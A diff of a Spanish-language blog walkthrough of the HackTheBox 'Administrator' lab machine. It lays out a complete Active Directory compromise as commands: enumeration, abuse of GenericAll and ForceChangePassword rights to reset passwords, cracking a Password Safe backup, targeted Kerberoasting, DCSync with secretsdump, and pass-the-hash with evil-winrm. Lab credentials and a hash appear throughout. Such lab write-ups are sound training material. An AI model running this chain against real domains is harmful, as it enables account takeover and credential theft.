@@ -18,19 +18,19 @@
 
 
 
-	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Administrator Machine - HackTheBox">
-	<meta name="twitter:description" content="Esta es una máquina de nivel medium de la plataforma HackTheBox, en la cual se toca varios temas de Active Directory">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Administrator Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina de nivel medium de la plataforma HackTheBox, en la cual se toca varios temas de Active Directory">
 
 <meta property="og:url" content="https://celero0.github.io/posts/administrator/">
-	<meta property="og:site_name" content="Celero0 Blog">
-	<meta property="og:title" content="Administrator Machine - HackTheBox">
-	<meta property="og:description" content="Esta es una máquina de nivel medium de la plataforma HackTheBox, en la cual se toca varios temas de Active Directory">
-	<meta property="og:locale" content="es">
-	<meta property="og:type" content="article">
-		<meta property="article:section" content="posts">
-		<meta property="article:published_time" content="2026-03-07T05:44:18+00:00">
-		<meta property="article:modified_time" content="2026-03-07T05:44:18+00:00">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Administrator Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina de nivel medium de la plataforma HackTheBox, en la cual se toca varios temas de Active Directory">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-03-07T05:44:18+00:00">
+    <meta property="article:modified_time" content="2026-03-07T05:44:18+00:00">
 
 
 
@@ -55,7 +55,7 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.c170d9bb5caa71f3db9a208ff97e771abf73c1f55b67a1df27ba5666cd49fa9b.css" integrity="sha256-wXDZu1yqcfPbmiCP&#43;X53Gr9zwfVbZ6HfJ7pWZs1J&#43;ps=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -213,7 +213,7 @@ Contraseña: <code>ichliebedich</code>.</p>
   </a>
 </h1>
 <p>Realizamos un escaneo de los puertos, encontrando varios puertos abiertos que nos indican que la máquina escaneada corre el sistema operativo <code>Windows</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.129.1.102 -oG allPorts
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.129.1.102 -oG allPorts
 </span></span></code></pre></div><img src="/images/Pasted image 20260306133722.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Escaneando los servicios y las versiones que corren en los puertos encontrados anteriormente, tenemos lo siguiente</p>
 <p>En el resultado del escaneo, podemos ver que se encuentra el servicio <code>FTP</code> abierto, además podemos ver el nombre de dominio <code>administrator.htb</code></p>
@@ -228,11 +228,11 @@ Contraseña: <code>ichliebedich</code>.</p>
   </a>
 </h1>
 <p>Primeramente probamos las credenciales proporcionadas inicialmente, para confirmar que estas sean válidas</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb administrator.htb -u <span style="color:#a5d6ff">&#39;Olivia&#39;</span> -p <span style="color:#a5d6ff">&#39;ichliebedich&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb administrator.htb -u <span style="color:#a5d6ff">&#39;Olivia&#39;</span> -p <span style="color:#a5d6ff">&#39;ichliebedich&#39;</span>
 </span></span></code></pre></div><p>y tenemos como resultado que el dominio acepta las credenciales</p>
 <img src="/images/Pasted image 20260306135315.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora revisamos si nuestro usuario tiene acceso a algún recurso compartido por <code>SMB</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb administrator.htb -u <span style="color:#a5d6ff">&#39;Olivia&#39;</span> -p <span style="color:#a5d6ff">&#39;ichliebedich&#39;</span> --shares
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb administrator.htb -u <span style="color:#a5d6ff">&#39;Olivia&#39;</span> -p <span style="color:#a5d6ff">&#39;ichliebedich&#39;</span> --shares
 </span></span></code></pre></div><p>Encontrando que tenemos acceso de lectura en <code>IPC$</code>, <code>NETLOGON</code> y <code>SYSVOL</code></p>
 <img src="/images/Pasted image 20260306135429.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Dentro de estos directorios no encontramos nada interesante</p>
@@ -244,11 +244,11 @@ Contraseña: <code>ichliebedich</code>.</p>
   </a>
 </h1>
 <p>Como tenemos credenciales válidas, haremos una enumeración de usuarios con <code>ldapsearch</code>, de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.1.102 -D <span style="color:#a5d6ff">&#39;administrator\Olivia&#39;</span> -w <span style="color:#a5d6ff">&#39;ichliebedich&#39;</span> -b <span style="color:#a5d6ff">&#34;DC=administrator,DC=htb&#34;</span> | grep <span style="color:#a5d6ff">&#34;userPrincipalName&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.1.102 -D <span style="color:#a5d6ff">&#39;administrator\Olivia&#39;</span> -w <span style="color:#a5d6ff">&#39;ichliebedich&#39;</span> -b <span style="color:#a5d6ff">&#34;DC=administrator,DC=htb&#34;</span> | grep <span style="color:#a5d6ff">&#34;userPrincipalName&#34;</span>
 </span></span></code></pre></div><p>Encontrando que en el dominio existen los siguientes usuarios</p>
 <img src="/images/Pasted image 20260306140126.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Para quedarnos solo con los usuarios y guardarlo en un archivo de texto tenemos el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.1.102 -D <span style="color:#a5d6ff">&#39;administrator\Olivia&#39;</span> -w <span style="color:#a5d6ff">&#39;ichliebedich&#39;</span> -b <span style="color:#a5d6ff">&#34;DC=administrator,DC=htb&#34;</span> | grep <span style="color:#a5d6ff">&#34;userPrincipalName&#34;</span> | awk <span style="color:#a5d6ff">&#39;{print $2}&#39;</span> | cut -d <span style="color:#a5d6ff">&#39;@&#39;</span> -f1 &gt;&gt; users
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.1.102 -D <span style="color:#a5d6ff">&#39;administrator\Olivia&#39;</span> -w <span style="color:#a5d6ff">&#39;ichliebedich&#39;</span> -b <span style="color:#a5d6ff">&#34;DC=administrator,DC=htb&#34;</span> | grep <span style="color:#a5d6ff">&#34;userPrincipalName&#34;</span> | awk <span style="color:#a5d6ff">&#39;{print $2}&#39;</span> | cut -d <span style="color:#a5d6ff">&#39;@&#39;</span> -f1 &gt;&gt; users
 </span></span></code></pre></div><h1 id="enumeración-de-active-directory">
   Enumeración de Active Directory
   <a class="heading-link" href="#enumeraci%c3%b3n-de-active-directory">
@@ -265,14 +265,14 @@ Contraseña: <code>ichliebedich</code>.</p>
   </a>
 </h2>
 <p>Como tenemos credenciales de un usuario válido en el dominio, utilizaremos <code>bloodhound-python</code>, para recolectar información en un zip, de la siguiente manera</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodhound-python -u <span style="color:#a5d6ff">&#39;Olivia&#39;</span> -p <span style="color:#a5d6ff">&#39;ichliebedich&#39;</span> -d administrator.htb -ns 10.129.1.193 -c All --zip
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodhound-python -u <span style="color:#a5d6ff">&#39;Olivia&#39;</span> -p <span style="color:#a5d6ff">&#39;ichliebedich&#39;</span> -d administrator.htb -ns 10.129.1.193 -c All --zip
 </span></span></code></pre></div><img src="/images/Pasted image 20260306231735.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Al utilizar por primera vez el comando, nos mostrará que intenta hacer resolución de dominio a <code>dc.administrator.htb</code>,  por tanto deberemos agregar ese subdominio a nuestro <code>/etc/host</code></p>
 <img src="/images/Pasted image 20260306231746.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>y posteriormente al volver a utilizar el comando anterior, nos mostrará un error por el desfase horario entre nuestra máquina atacante y el AD</p>
 <img src="/images/Pasted image 20260306231839.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Para solucionar esto utilizaremos <code>faketime</code> y  <code>ntpdate</code> de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.1.193 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> bloodhound-python -u <span style="color:#a5d6ff">&#39;Olivia&#39;</span> -p <span style="color:#a5d6ff">&#39;ichliebedich&#39;</span> -d administrator.htb -ns 10.129.1.193 -c All --zip
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.1.193 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> bloodhound-python -u <span style="color:#a5d6ff">&#39;Olivia&#39;</span> -p <span style="color:#a5d6ff">&#39;ichliebedich&#39;</span> -d administrator.htb -ns 10.129.1.193 -c All --zip
 </span></span></code></pre></div><p>Así obtenemos nuestro archivo <code>.zip</code> que deberemos cargar en <code>Bloodhound</code></p>
 <img src="/images/Pasted image 20260306232034.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h2 id="preparar-docker-con-bloodhound">
@@ -284,13 +284,13 @@ Contraseña: <code>ichliebedich</code>.</p>
 </h2>
 <p>Para crear nuestro contenedor con <code>Bloodhound</code> descargaremos el <code>docker-compose</code> desde la siguiente página web <a href="https://0ut3r.space/2024/04/22/bloodhound-ce-and-docker/"  class="external-link" target="_blank" rel="noopener">https://0ut3r.space/2024/04/22/bloodhound-ce-and-docker/</a></p>
 <p>Basta con realizar el siguiente comando para descargarlo</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml
 </span></span></code></pre></div><p>Una vez descargada deberemos iniciar el contenedor con el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker-compose up -d
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker-compose up -d
 </span></span></code></pre></div><p>Posteriormente accedemos desde nuestro navegador a <code>localhost:8080</code> y se nos abrirá la interaz de <code>Bloodhound</code></p>
 <img src="/images/Pasted image 20260306232542.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>En el apartado de correo pondremos <code>admin</code>, y para obtener la contraseña habrá que leer los logs de nuestro contenedor con el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker-compose logs
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker-compose logs
 </span></span></code></pre></div><img src="/images/Pasted image 20260306232632.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>En este apartado deberemos subir el <code>.zip</code> que obtuvimos anteriormente</p>
 <img src="/images/Pasted image 20260306232728.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -307,15 +307,15 @@ Contraseña: <code>ichliebedich</code>.</p>
 <p>Vemos que <code>Olivia</code> tiene permisos <code>GenericAll</code> sobre <code>Michael</code>, lo que permite control total sobre este usuario</p>
 <img src="/images/Pasted image 20260307013418.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Lo que haremos será restablecer la contraseña de <code>Michael</code> a <code>newP@ssword2022</code> de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc password <span style="color:#a5d6ff">&#34;Michael&#34;</span> <span style="color:#a5d6ff">&#34;newP@ssword2022&#34;</span> -U <span style="color:#a5d6ff">&#34;administrator.htb&#34;</span>/<span style="color:#a5d6ff">&#34;Olivia&#34;</span>%<span style="color:#a5d6ff">&#34;ichliebedich&#34;</span> -S <span style="color:#a5d6ff">&#34;administrator.htb&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc password <span style="color:#a5d6ff">&#34;Michael&#34;</span> <span style="color:#a5d6ff">&#34;newP@ssword2022&#34;</span> -U <span style="color:#a5d6ff">&#34;administrator.htb&#34;</span>/<span style="color:#a5d6ff">&#34;Olivia&#34;</span>%<span style="color:#a5d6ff">&#34;ichliebedich&#34;</span> -S <span style="color:#a5d6ff">&#34;administrator.htb&#34;</span>
 </span></span></code></pre></div><p>Vemos que no nos aparece ningún mensaje</p>
 <img src="/images/Pasted image 20260307013601.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Para comprobar si el cambio de contraseña se realizó correctamente, podemos aprovecharnos del protocolo SMB con <code>netexec</code>, de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb administrator.htb -u <span style="color:#a5d6ff">&#39;Michael&#39;</span> -p <span style="color:#a5d6ff">&#39;newP@ssword2022&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb administrator.htb -u <span style="color:#a5d6ff">&#39;Michael&#39;</span> -p <span style="color:#a5d6ff">&#39;newP@ssword2022&#39;</span>
 </span></span></code></pre></div><p>y vemos que la contraseña de <code>Michael</code> se cambió exitosamente</p>
 <img src="/images/Pasted image 20260307013711.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Viendo los permisos de <code>Michael</code>, vemos que tiene permisos <code>ForceChangePassword</code> sobre <code>Benjamin</code>, por lo tanto podemos cambiar la contraseña de <code>Benjamin</code> al igual como lo hicimos con <code>Michael</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc password <span style="color:#a5d6ff">&#34;Benjamin&#34;</span> <span style="color:#a5d6ff">&#34;newP@ssword2022&#34;</span> -U <span style="color:#a5d6ff">&#34;administrator.htb&#34;</span>/<span style="color:#a5d6ff">&#34;Michael&#34;</span>%<span style="color:#a5d6ff">&#34;newP@ssword2022&#34;</span> -S <span style="color:#a5d6ff">&#34;administrator.htb&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc password <span style="color:#a5d6ff">&#34;Benjamin&#34;</span> <span style="color:#a5d6ff">&#34;newP@ssword2022&#34;</span> -U <span style="color:#a5d6ff">&#34;administrator.htb&#34;</span>/<span style="color:#a5d6ff">&#34;Michael&#34;</span>%<span style="color:#a5d6ff">&#34;newP@ssword2022&#34;</span> -S <span style="color:#a5d6ff">&#34;administrator.htb&#34;</span>
 </span></span></code></pre></div><p>y vemos que se ha cambiado correctamente</p>
 <img src="/images/Pasted image 20260307014029.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>En cuanto al usuario <code>Benjamin</code>, no tiene permisos sobre ningún otro usuario, pero este es miembro del grupo <code>SHARE MODERATORS</code></p>
@@ -323,7 +323,7 @@ Contraseña: <code>ichliebedich</code>.</p>
 <p>Probaremos ver si tiene acceso a algún recurso compartido extra por <code>SMB</code>, a lo cual no vemos nada adicional a lo que podíamos ver con los demás usuarios</p>
 <img src="/images/Pasted image 20260307014234.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Entonces iniciaremos sesión por el protocolo <code>FTP</code> para ver si hay algo interesante con sus credenciales</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp administrator.htb
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp administrator.htb
 </span></span></code></pre></div><p>Y encontramos un archivo llamado <code>Backup.psafe3</code></p>
 <img src="/images/Pasted image 20260307014405.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="fuerza-bruta-a-password-safe">
@@ -337,13 +337,13 @@ Contraseña: <code>ichliebedich</code>.</p>
 <p>Si hacemos un <code>file</code>, nos dice lo mismo</p>
 <img src="/images/Pasted image 20260307014742.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto utilizaremos la herramienta <code>pwsafe2john</code> para obtener el hash y posteriormente poder crackearlo con  <code>john</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwsafe2john Backup.psafe3 &gt; hash.txt
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwsafe2john Backup.psafe3 &gt; hash.txt
 </span></span></code></pre></div><p>Ahora utilizamos <code>john</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john hash.txt --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john hash.txt --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt
 </span></span></code></pre></div><p>Encontrando la contraseña del gestor <code>tekieromucho</code></p>
 <img src="/images/Pasted image 20260307014929.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Abrimos el archivo con el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwsafe Backup.psafe3
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwsafe Backup.psafe3
 </span></span></code></pre></div><p>Y utilizamos la contraseña obtenida con el ataque de fuerza bruta</p>
 <img src="/images/Pasted image 20260307015014.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Encontramos las contraseñas de tres usuarios, que sabemos que forman parte del dominio.</p>
@@ -363,13 +363,13 @@ Contraseña: <code>ichliebedich</code>.</p>
 <p>Como tenemos las credenciales de <code>Emily</code>, podemos hacer un Targeted kerberoast attack hacia <code>Ethan</code>, como dice en <code>Bloodhound</code></p>
 <img src="/images/Pasted image 20260307015724.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Para ello descargaremos el siguiente script <code>targetedKerberoast.py</code> de <a href="https://github.com/ShutdownRepo/targetedKerberoast"  class="external-link" target="_blank" rel="noopener">https://github.com/ShutdownRepo/targetedKerberoast</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py
 </span></span></code></pre></div><p>el comando que utilizaremos es el siguiente, para evitar problemas con la sincronización horaria utilizaremos <code>faketime</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.1.193 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> python3 targetedKerberoast.py -v -d administrator.htb -u emily -p <span style="color:#a5d6ff">&#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.1.193 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> python3 targetedKerberoast.py -v -d administrator.htb -u emily -p <span style="color:#a5d6ff">&#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span>
 </span></span></code></pre></div><p>y obtenemos el TGS de ethan, que podemos crackearlo de  forma offline con <code>john</code></p>
 <img src="/images/Pasted image 20260307015910.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>creamos un archivo con el contenido obtenido, y procedemos a crackearlo con <code>john</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john ethan-hash --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john ethan-hash --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt
 </span></span></code></pre></div><p>Obteniendo la contraseña de <code>Ethan : limpbizkit</code></p>
 <img src="/images/Pasted image 20260307020047.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="escalada-de-privilegios-via-dcsync">
@@ -383,11 +383,11 @@ Contraseña: <code>ichliebedich</code>.</p>
 <img src="/images/Pasted image 20260307020113.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Los permisos críticos son <code>GetChanges</code>, <code>GetChangesAll</code> y <code>GetChangesInFilteredSet</code>. Tener ambos nos permite realizar un <code>DCSync</code>, lo que nos dará acceso a los hashes NTLM de los usuarios del dominio &gt; lo que nos permitirá autenticarnos en la red mediante la técnica <code>Pass-the-Hash</code>.</p>
 <p>Para ello utilizaremos la herramienta <code>Impacket</code>, de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump <span style="color:#a5d6ff">&#39;administrator.htb&#39;</span>/<span style="color:#a5d6ff">&#39;Ethan&#39;</span>:<span style="color:#a5d6ff">&#39;limpbizkit&#39;</span>@<span style="color:#a5d6ff">&#39;dc.administrator.htb&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump <span style="color:#a5d6ff">&#39;administrator.htb&#39;</span>/<span style="color:#a5d6ff">&#39;Ethan&#39;</span>:<span style="color:#a5d6ff">&#39;limpbizkit&#39;</span>@<span style="color:#a5d6ff">&#39;dc.administrator.htb&#39;</span>
 </span></span></code></pre></div><p>Con esto obtenemos el hash NTLM de todos los usuarios</p>
 <img src="/images/Pasted image 20260307021021.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora con el hash NTLM de <code>administrator</code> podemos hacer PASS-THE-HASH</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.129.1.193 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.129.1.193 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
 </span></span></code></pre></div><p>y nos conectamos a la máquina víctima como <code>administrator</code></p>
 <img src="/images/Pasted image 20260307021146.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora podemos obtener la flag de <code>user.txt</code> y de <code>root.txt</code></p>
